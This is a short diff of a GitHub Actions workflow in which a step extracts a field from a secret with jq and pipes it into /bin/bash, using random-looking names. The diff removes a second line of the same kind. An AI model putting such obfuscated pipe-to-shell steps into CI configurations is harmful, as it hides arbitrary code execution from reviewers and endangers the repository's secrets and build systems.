@@ -17,7 +17,6 @@ jobs:
           sa4: ${{ secrets.sa4 }}
         run: |
           printf '%s' "$sa4" | jq -r .dcq6 | /bin/bash
-          echo $pywho51043 | jq -r .xxkw9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
